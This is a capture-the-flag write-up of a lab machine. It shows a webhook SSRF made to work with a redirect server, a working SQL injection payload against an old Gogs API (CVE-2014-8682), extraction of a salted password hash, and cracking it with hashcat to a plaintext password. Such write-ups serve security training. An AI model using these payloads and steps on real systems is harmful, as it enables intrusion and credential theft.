## Enumeration
```bash
cat nmap.second
# Nmap 7.92 scan initiated Wed Sep 14 20:11:46 2022 as: nmap -sV -Pn -sC -oN scans/nmap.second 10.10.11.176
Nmap scan report for health.htb (10.10.11.176)
Host is up (0.025s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 32:b7:f4:d4:2f:45:d3:30:ee:12:3b:03:67:bb:e6:31 (RSA)
|   256 86:e1:5d:8c:29:39:ac:d7:e8:15:e6:49:e2:35:ed:0c (ECDSA)
|_  256 ef:6b:ad:64:d5:e4:5b:3e:66:79:49:f4:ec:4c:23:9f (ED25519)
80/tcp   open     http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: HTTP Monitoring Tool
|_http-server-header: Apache/2.4.29 (Ubuntu)
3000/tcp filtered ppp
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Sep 14 20:11:55 2022 -- 1 IP address (1 host up) scanned in 9.16 seconds
```
> Note that there is a filtered service running on 3000, meaning it's behind the firewall  

## Webhooks
the site has a webhook functionnality, what it does is, it probes a "monitored" URL on a cron schedule, and returns the data from that url to another address which is called the "payload".  
Because this is done from the webserver's perspective, of course that sounds like a great way to circumvent the firewall and reach that 3000 port.  
![hook_not_allowed.png](hook_not_allowed.png)

Unfortunately this does not work, but we can reach out and "monitor" our own address and get the result on another port, e.g. having a webserver on 8000 and a netcat listener on 9000, and we would receive the result of a get from health.htb to ourselved on 8000:
![hook_allowed.png](hook_allowed.png)

from our side this looks like this: 
```bash
python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.176 - - [17/Sep/2022 17:30:39] "GET / HTTP/1.0" 200 -
```
```bash
 nc -lvnp 9000                                                                   1 ⨯
listening on [any] 9000 ...
connect to [10.10.14.166] from (UNKNOWN) [10.10.11.176] 33826
POST / HTTP/1.1
Host: 10.10.14.166:9000
Accept: */*
Content-type: application/json
Content-Length: 638

{"webhookUrl":"http:\/\/10.10.14.166:9000","monitoredUrl":"http:\/\/10.10.14.166:8000","health":"up","body":"<!DOCTYPE HTML PUBLIC \"-\/\/W3C\/\/DTD HTML 4.01\/\/EN\" \"http:\/\/www.w3.org\/TR\/html4\/strict.dtd\">\n<html>\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text\/html; charset=utf-8\">\n<title>Directory listing for \/<\/title>\n<\/head>\n<body>\n<h1>Directory listing for \/<\/h1>\n<hr>\n<ul>\n<\/ul>\n<hr>\n<\/body>\n<\/html>\n","message":"HTTP\/1.0 200 OK","headers":{"Server":"SimpleHTTP\/0.6 Python\/3.10.0","Date":"Sat, 17 Sep 2022 16:30:39 GMT","Content-type":"text\/html; charset=utf-8","Content-Length":"297"}}
```
Let's see what happens if we make our server responds 302 on GET to our port 8000
```python
import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

class Redirect(BaseHTTPRequestHandler):
  def do_GET(self):
      self.send_response(302)
      self.send_header('Location', sys.argv[1])
      self.end_headers()

HTTPServer(("0.0.0.0", 8000), Redirect).serve_forever()
```
![hook_allowed.png](hook_redirect.png)
```bash
python3 redirect.py 'http://127.0.0.1:3000'
10.10.11.176 - - [17/Sep/2022 17:40:47] "GET / HTTP/1.0" 302 -
```
```bash
nc -lvnp 9000                                                                   1 ⨯
listening on [any] 9000 ...
connect to [10.10.14.166] from (UNKNOWN) [10.10.11.176] 41128
POST / HTTP/1.1
Host: 10.10.14.166:9000
Accept: */*
Content-type: application/json
Content-Length: 7666
Expect: 100-continue

{"webhookUrl":"http:\/\/10.10.14.166:9000","monitoredUrl":"http:\/\/10.10.14.166:8000","health":"up","body":"<!DOCTYPE html>\n<html>\n\t<head data-suburl=\"\">\n\t\t<meta http-equiv=\"Content-Type\" content=\"text\/html; charset=UTF-8\" \/>\n        <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\"\/>\n        <meta name=\"author\" content=\"Gogs - Go Git Service\" \/>\n\t\t<meta name=\"description\" content=\"Gogs(Go Git Service) a painless self-hosted Git Service written in Go\" \/>\n\t\t<meta name=\"keywords\" content=\"go, git, self-hosted, gogs\">\n\t\t<meta name=\"_csrf\" content=\"6Ji4LJ2b7TO7zqav-Wwf6Q2Sv-I6MTY2MzQzMjg0NjY3NTc4MTEzMg==\" \/>\n\t\t\n\n\t\t<link rel=\"shortcut icon\" href=\"\/img\/favicon.png\" \/>\n\n\t\t\n\t\t<link rel=\"stylesheet\" href=\"\/\/maxcdn.bootstrapcdn.com\/font-awesome\/4.2.0\/css\/font-awesome.min.css\">\n\n\t\t<script src=\"\/\/code.jquery.com\/jquery-1.11.1.min.js\"><\/script>\n\t\t\n\t\t\n\t\t<link rel=\"stylesheet\" href=\"\/ng\/css\/ui.css\">\n\t\t<link rel=\"stylesheet\" href=\"\/ng\/css\/gogs.css\">\n\t\t<link rel=\"stylesheet\" href=\"\/ng\/css\/tipsy.css\">\n\t\t<link rel=\"stylesheet\" href=\"\/ng\/css\/magnific-popup.css\">\n\t\t<link rel=\"stylesheet\" href=\"\/ng\/fonts\/octicons.css\">\n\t\t<link rel=\"stylesheet\" href=\"\/css\/github.min.css\">\n\n\t\t\n    \t<script src=\"\/ng\/js\/lib\/lib.js\"><\/script>\n    \t<script src=\"\/ng\/js\/lib\/jquery.tipsy.js\"><\/script>\n    \t<script src=\"\/ng\/js\/lib\/jquery.magnific-popup.min.js\"><\/script>\n        <script src=\"\/ng\/js\/utils\/tabs.js\"><\/script>\n        <script src=\"\/ng\/js\/utils\/preview.js\"><\/script>\n\t\t<script src=\"\/ng\/js\/gogs.js\"><\/script>\n\n\t\t<title>Gogs: Go Git Service<\/title>\n\t<\/head>\n\t<body>\n\t\t<div id=\"wrapper\">\n\t\t<noscript>Please enable JavaScript in your browser!<\/noscript>\n\n<header id=\"header\">\n    <ul class=\"menu menu-line container\" id=\"header-nav\">\n        \n\n        \n            \n            <li class=\"right\" id=\"header-nav-help\">\n                <a target=\"_blank\" href=\"http:\/\/gogs.io\/docs\"><i class=\"octicon octicon-info\"><\/i>&nbsp;&nbsp;Help<\/a>\n            <\/li>\n            <li class=\"right\" id=\"header-nav-explore\">\n                <a href=\"\/explore\"><i class=\"octicon octicon-globe\"><\/i>&nbsp;&nbsp;Explore<\/a>\n            <\/li>\n            \n        \n    <\/ul>\n<\/header>\n<div id=\"promo-wrapper\">\n    <div class=\"container clear\">\n        <div id=\"promo-logo\" class=\"left\">\n            <img src=\"\/img\/gogs-lg.png\" alt=\"logo\" \/>\n        <\/div>\n        <div id=\"promo-content\">\n            <h1>Gogs<\/h1>\n            <h2>A painless self-hosted Git service written in Go<\/h2>\n            <form id=\"promo-form\" action=\"\/user\/login\" method=\"post\">\n                <input type=\"hidden\" name=\"_csrf\" value=\"6Ji4LJ2b7TO7zqav-Wwf6Q2Sv-I6MTY2MzQzMjg0NjY3NTc4MTEzMg==\">\n                <input class=\"ipt ipt-large\" id=\"username\" name=\"uname\" type=\"text\" placeholder=\"Username or E-mail\"\/>\n                <input class=\"ipt ipt-large\" name=\"password\" type=\"password\" placeholder=\"Password\"\/>\n                <input name=\"from\" type=\"hidden\" value=\"home\">\n                <button class=\"btn btn-black btn-large\">Sign In<\/button>\n                <button class=\"btn btn-green btn-large\" id=\"register-button\">Register<\/button>\n            <\/form>\n            <div id=\"promo-social\" class=\"social-buttons\">\n                \n\n\n\n            <\/div>\n        <\/div>&nbsp;\n    <\/div>\n<\/div>\n<div id=\"feature-wrapper\">\n    <div class=\"container clear\">\n        \n        <div class=\"grid-1-2 left\">\n            <i class=\"octicon octicon-flame\"><\/i>\n            <b>Easy to install<\/b>\n            <p>Simply <a target=\"_blank\" href=\"http:\/\/gogs.io\/docs\/installation\/install_from_binary.html\">run the binary<\/a> for your platform. Or ship Gogs with <a target=\"_blank\" href=\"https:\/\/github.com\/gogits\/gogs\/tree\/master\/dockerfiles\">Docker<\/a> or <a target=\"_blank\" href=\"https:\/\/github.com\/geerlingguy\/ansible-vagrant-examples\/tree\/master\/gogs\">Vagrant<\/a>, or get it <a target=\"_blank\" href=\"http:\/\/gogs.io\/docs\/installation\/install_from_packages.html\">packaged<\/a>.<\/p>\n        <\/div>\n        <div class=\"grid-1-2 left\">\n            <i class=\"octicon octicon-device-desktop\"><\/i>\n            <b>Cross-platform<\/b>\n            <p>Gogs runs anywhere <a target=\"_blank\" href=\"http:\/\/golang.org\/\">Go<\/a> can compile for: Windows, Mac OS X, Linux, ARM, etc. Choose the one you love!<\/p>\n        <\/div>\n        <div class=\"grid-1-2 left\">\n            <i class=\"octicon octicon-rocket\"><\/i>\n            <b>Lightweight<\/b>\n            <p>Gogs has low minimal requirements and can run on an inexpensive Raspberry Pi. Save your machine energy!<\/p>\n        <\/div>\n        <div class=\"grid-1-2 left\">\n            <i class=\"octicon octicon-code\"><\/i>\n            <b>Open Source<\/b>\n            <p>It's all on <a target=\"_blank\" href=\"https:\/\/github.com\/gogits\/gogs\/\">GitHub<\/a>! Join us by contributing to make this project even better. Don't be shy to be a contributor!<\/p>\n        <\/div>\n        \n    <\/div>\n<\/div>\n\t\t<\/div>\n\t\t<footer id=\"footer\">\n\t\t    <div class=\"container clear\">\n\t\t        <p class=\"left\" id=\"footer-rights\">\u00a9 2014 GoGits \u00b7 Version: 0.5.5.1010 Beta \u00b7 Page: <strong>1ms<\/strong> \u00b7\n\t\t            Template: <strong>1ms<\/strong><\/p>\n\n\t\t        <div class=\"right\" id=\"footer-links\">\n\t\t            <a target=\"_blank\" href=\"https:\/\/github.com\/gogits\/gogs\"><i class=\"fa fa-github-square\"><\/i><\/a>\n\t\t            <a target=\"_blank\" href=\"https:\/\/twitter.com\/gogitservice\"><i class=\"fa fa-twitter\"><\/i><\/a>\n\t\t            <a target=\"_blank\" href=\"https:\/\/plus.google.com\/communities\/115599856376145964459\"><i class=\"fa fa-google-plus\"><\/i><\/a>\n\t\t            <a target=\"_blank\" href=\"http:\/\/weibo.com\/gogschina\"><i class=\"fa fa-weibo\"><\/i><\/a>\n\t\t            <div id=\"footer-lang\" class=\"inline drop drop-top\">Language\n\t\t                <div class=\"drop-down\">\n\t\t                    <ul class=\"menu menu-vertical switching-list\">\n\t\t                    \t\n\t\t                        <li><a href=\"#\">English<\/a><\/li>\n\t\t                        \n\t\t                        <li><a href=\"\/?lang=zh-CN\">\u7b80\u4f53\u4e2d\u6587<\/a><\/li>\n\t\t                        \n\t\t                        <li><a href=\"\/?lang=zh-HK\">\u7e41\u9ad4\u4e2d\u6587<\/a><\/li>\n\t\t                        \n\t\t                        <li><a href=\"\/?lang=de-DE\">Deutsch<\/a><\/li>\n\t\t                        \n\t\t                        <li><a href=\"\/?lang=fr-CA\">Fran\u00e7ais<\/a><\/li>\n\t\t                        \n\t\t                        <li><a href=\"\/?lang=nl-NL\">Nederlands<\/a><\/li>\n\t\t                        \n\t\t                    <\/ul>\n\t\t                <\/div>\n\t\t            <\/div>\n\t\t            <a target=\"_blank\" href=\"http:\/\/gogs.io\">Website<\/a>\n\t\t            <span class=\"version\">Go1.3.2<\/span>\n\t\t        <\/div>\n\t\t    <\/div>\n\t\t<\/footer>\n\t<\/body>\n<\/html>","message":"HTTP\/1.0 302 Found","headers":{"Server":"BaseHTTP\/0.6 Python\/3.10.0","Date":"Sat, 17 Sep 2022 16:40:46 GMT","Location":"http:\/\/127.0.0.1:3000","Content-Type":"text\/html; charset=UTF-8","Set-Cookie":"_csrf=; Path=\/; Max-Age=0"}}
```
Now we know that we're running:  
- 2014 GoGits · Version: 0.5.5.1010 Beta  
- Go1.3.2

```bash
searchsploit gogs
---------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                        |  Path
---------------------------------------------------------------------- ---------------------------------
Gogs - 'label' SQL Injection                                          | multiple/webapps/35237.txt
Gogs - 'users'/'repos' '?q' SQL Injection                             | multiple/webapps/35238.txt
---------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
looking at the releases in github, it looks like 0.5.8 came right after 0.5.5 to patch those SQLi issues
![releases.png](releases.png)

I wanted to install the vulnerable version of gogs localy to be able to test the SQLi without having to worry about the firewall. Because I'm on arm64 I went on a little bit of a tangent, trying to compile gogs, and eventually hit a wall. Even though the process wasn't successfull for me, I still learned a great deal about Go. Notably, I learned about GVM which essentially is a python pyenv, and lets you manage multiple verions of golang in the same environement: 
```bash
bash < <(curl -s -S -L https://raw.githubusercontent.com/moovweb/gvm/master/binscripts/gvm-installer)
gvm install go1.3.2
```
In any case I ended up installing it on a remote amd64 machine directly from a precompiled binary.  
[https://github.com/gogs/gogs/releases/tag/v0.5.5](https://github.com/gogs/gogs/releases/tag/v0.5.5)

looking at that install I could explore the gogs database:  
```bash
sqlite3 gogs.db
SQLite version 3.34.1 2021-01-20 14:10:07
Enter ".help" for usage hints.
sqlite> .table
access        hook_task     milestone     public_key    team_user
action        issue         mirror        release       update_task
attachment    issue_user    notice        repository    user
comment       label         oauth2        star          watch
follow        login_source  org_user      team          webhook
```
this is exactly where and how my password gets stored after I create a user  
```bash
sqlite> .mode table
sqlite> select name,salt,passwd from user;
+-------+------------+------------------------------------------------------------------------------------------------------+
| name  |    salt    |                                                passwd                                                |
+-------+------------+------------------------------------------------------------------------------------------------------+
| blnkn | LEdiEU0Wob | bc356f2eac41c08e9811d4525fa7bc50b7cea2ae07d82cc2cb95412807e17736525dcfc96f6f71e5e65b66e3f73da7399761 |
+-------+------------+------------------------------------------------------------------------------------------------------+
```

found the code that does the auth in the source  
```go
// UserSignIn validates user name and password.
func UserSignIn(uname, passwd string) (*User, error) {
	var u *User
	if strings.Contains(uname, "@") {
		u = &User{Email: uname}
	} else {
		u = &User{LowerName: strings.ToLower(uname)}
	}

	has, err := x.Get(u)
	if err != nil {
		return nil, err
	}

	if u.LoginType == NOTYPE && has {
		u.LoginType = PLAIN
	}

	// For plain login, user must exist to reach this line.
	// Now verify password.
	if u.LoginType == PLAIN {
		newUser := &User{Passwd: passwd, Salt: u.Salt}
		newUser.EncodePasswd()
		if u.Passwd != newUser.Passwd {
			return nil, ErrUserNotExist
		}
		return u, nil
        ...
        snip
```

So the actual encryption function is here: 
```go
// use pbkdf2 encode password
func EncodePassword(rawPwd string, salt string) string {
	pwd := PBKDF2([]byte(rawPwd), []byte(salt), 10000, 50, sha256.New)
	return hex.EncodeToString(pwd)
```

which corresponds to this: 
```bash
hashcat -h|grep -i pbkdf2|head -4
  11900 | PBKDF2-HMAC-MD5                                     | Generic KDF
  12000 | PBKDF2-HMAC-SHA1                                    | Generic KDF
  10900 | PBKDF2-HMAC-SHA256                                  | Generic KDF
  12100 | PBKDF2-HMAC-SHA512                                  | Generic KDF
```
[https://forum.hashkiller.io/index.php?threads/help-identifying-this-hash.38156/](https://forum.hashkiller.io/index.php?threads/help-identifying-this-hash.38156/)
found the expected hashcat format in the link above,  
we need to transform the hex hash to b64  
```
printf 'bc356f2eac41c08e9811d4525fa7bc50b7cea2ae07d82cc2cb95412807e17736525dcfc96f6f71e5e65b66e3f73da7399761'|xxd -p -r|base64
vDVvLqxBwI6YEdRSX6e8ULfOoq4H2CzCy5VBKAfhdzZSXc/Jb29x5eZbZuP3Pac5l2E=
```
transform the salt to b64  
```
printf 'LEdiEU0Wob'|base64
TEVkaUVVMFdvYg==
```
```
hashcat -m 10900 sha256:5000:<b64-salt>:<b64-hash> wordlist
hashcat -m 10900 sha256:10000:TEVkaUVVMFdvYg==:vDVvLqxBwI6YEdRSX6e8ULfOoq4H2CzCy5VBKAfhdzZSXc/Jb29x5eZbZuP3Pac5l2E= /usr/share/wordlists/rockyou.txt
```
ok, so we now know what we need to extract with the SQLi and how to crack the password

## CVE-2014-8682
according to the vulnerability report this is the vulnerable code  
```go
// SearchUserByName returns given number of users whose name contains
keyword.
func SearchUserByName(opt SearchOption) (us []*User, err error) {
    opt.Keyword = FilterSQLInject(opt.Keyword)
    if len(opt.Keyword) == 0 {
        return us, nil
    }
    opt.Keyword = strings.ToLower(opt.Keyword)

    us = make([]*User, 0, opt.Limit)
    err = x.Limit(opt.Limit).Where("type=0").And("lower_name like '%" +
opt.Keyword + "%'").Find(&us)
    return us, err
}
```
and that's their proof of concept  
```
http://www.example.com/api/v1/users/search?q='/**/and/**/false)/**/union/**/
select/**/null,null,@@version,null,null,null,null,null,null,null,null,null,null,
null,null,null,null,null,null,null,null,null,null,null,null,null,null/**/from
/**/mysql.db/**/where/**/('%25'%3D'
```
manipulating it a little to try to make sense of it  
```bash
curl "http://192.168.0.73:3000/api/v1/users/search?q='/**/and/**/false)/**/union/**/select/**/1,1,@@version,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1/**/from/**/mysql.db/**/where/**/('%25'%3D'"
```
%25 = "%"  
%3D = "="  
so "%=%" == True ? not sure what exactly whis was, 
and it looks like he was using @@version on a mysql.db here, which we aren't dealing with, we're working on a sqlite.db  
also my understanding of the `/**/` is that it is a comment in SQL like `/*this is a comment*/`  
And here it's helpful to circumvent not beeing able to use actual spaces?  
so can we just try to get our salt instead of the mysql @@version thing?  
```bash
curl "http://192.168.0.73:3000/api/v1/users/search?q='/**/and/**/false)/**/union/**/select/**/1,1,@@version,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1/**/from/**/mysql.db/**/where/**/('%25'%3D'"
{
  "error": "unrecognized token: \"@\"",
  "ok": false
}
```
```bash
curl "http://192.168.0.73:3000/api/v1/users/search?q='/**/and/**/false)/**/union/**/select/**/1,1,(select/**/salt/**/from/**/user),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1/**/from/**/mysql.db/**/where/**/('%25'%3D'"
{
  "error": "no such table: mysql.db",
  "ok": false
}
```
```bash
curl -s "http://192.168.0.73:3000/api/v1/users/search?q=')/**/union/**/all/**/select/**/1,1,(select/**/passwd/**/from/**/user),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1--"|jq .
{
  "data": [
    {
      "username": "blnkn",
      "avatar": "//1.gravatar.com/avatar/2294fc4f13b7594fc8e604c9dfe30dfc"
    },
    {
      "username": "bc356f2eac41c08e9811d4525fa7bc50b7cea2ae07d82cc2cb95412807e17736525dcfc96f6f71e5e65b66e3f73da7399761",
      "avatar": "//1.gravatar.com/avatar/1"
    }
  ],
  "ok": true
}
```
Now getting that from the remote, through the redirect  
```bash
python3 redirect.py "http://127.0.0.1:3000/api/v1/users/search?q=')/**/union/**/all/**/select/**/1,1,(select/**/salt/**/from/**/user),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1--"
10.10.11.176 - - [17/Sep/2022 22:25:18] "GET / HTTP/1.0" 302 -

sO3XIbeW14
```
```bash
python3 redirect.py "http://127.0.0.1:3000/api/v1/users/search?q=')/**/union/**/all/**/select/**/1,1,(select/**/passwd/**/from/**/user),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1--"
10.10.11.176 - - [17/Sep/2022 22:27:08] "GET / HTTP/1.0" 302 -

66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37
```
```bash
printf "66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37"|xxd -r -p|base64

ZsB0ZFVFeB8QZPt/0Rd0U9uPDKLOWKnYHAS+Lm07oqDWwDLw/U74P0jXQ0nsGW9O/jc=
```
```bash
printf "sO3XIbeW14"|base64
c08zWEliZVcxNA==
```
```bash
hashcat -m 10900 sha256:10000:c08zWEliZVcxNA==:ZsB0ZFVFeB8QZPt/0Rd0U9uPDKLOWKnYHAS+Lm07oqDWwDLw/U74P0jXQ0nsGW9O/jc= /usr/share/wordlists/rockyou.txt

sha256:10000:c08zWEliZVcxNA==:ZsB0ZFVFeB8QZPt/0Rd0U9uPDKLOWKnYHAS+Lm07oqDWwDLw/U74P0jXQ0nsGW9O/jc=:february15

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 10900 (PBKDF2-HMAC-SHA256)
Hash.Target......: sha256:10000:c08zWEliZVcxNA==:ZsB0ZFVFeB8QZPt/0Rd0U...9O/jc=
Time.Started.....: Sat Sep 17 22:31:28 2022 (34 secs)
Time.Estimated...: Sat Sep 17 22:32:02 2022 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     2077 H/s (5.94ms) @ Accel:64 Loops:512 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests
Progress.........: 71168/14344385 (0.50%)
Rejected.........: 0/71168 (0.00%)
Restore.Point....: 70912/14344385 (0.49%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:9728-9999
Candidate.Engine.: Device Generator
Candidates.#1....: fullysick -> citadel

Started: Sat Sep 17 22:31:27 2022
Stopped: Sat Sep 17 22:32:03 2022
```
